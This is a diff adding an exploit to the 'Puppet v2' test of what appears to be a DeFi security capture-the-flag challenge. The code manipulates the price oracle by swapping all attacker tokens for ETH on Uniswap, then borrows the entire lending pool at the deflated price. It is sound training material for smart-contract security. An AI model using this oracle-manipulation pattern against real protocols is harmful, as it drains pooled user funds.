@@ -82,6 +82,65 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        var bal;
+
+        const getStats = async (step) => {
+            console.log("step -  ", step);
+            
+            bal = await this.token.balanceOf(this.uniswapExchange.address);
+            console.log("uniswap token:",(bal/10**18).toString());
+
+            bal = await ethers.provider.getBalance(this.weth.address);
+            console.log("uniswap ETH:",(bal/10**18).toString());
+
+            bal = await this.token.balanceOf(this.lendingPool.address);
+            console.log("pool token:",(bal/10**18).toString());
+
+            bal = await ethers.provider.getBalance(this.lendingPool.address);
+            console.log("pool ETH:",(bal/10**18).toString());
+
+            bal = await this.token.balanceOf(attacker.address);
+            console.log("attacker token:",(bal/10**18).toString());
+            bal = await ethers.provider.getBalance(attacker.address);
+            console.log("attacker ETH:",(bal/10**18).toString());
+        }
+
+        await getStats(1)
+
+        // approve the transaction
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+        // swap token for eth: having more eth than token...
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1, 
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+
+        await getStats(3)
+        
+        // Calcul amount of weth needed to deposit for getting all of the token in the pool
+        var amountETH = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("amount = ", (amountETH/10**18).toString())
+
+        // get balance of ETH after the swap and compare if there's enough ETH to get all of the token in the pool
+        let etherBalance = await ethers.provider.getBalance(attacker.address);
+        // we must have etherBalance > amountETH to meet deposit of WETH required
+        console.log("etherBal = ", (etherBalance/10**18).toString())
+
+
+        // wrap the ETH
+        await this.weth.connect(attacker).deposit({value: amountETH});
+        
+        // approve the lending pool
+        await this.weth.connect(attacker).approve(this.lendingPool.address, amountETH);
+
+        // get all of the token in the pool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE); 
+
+        await getStats(4)
     });
 
     after(async function () {
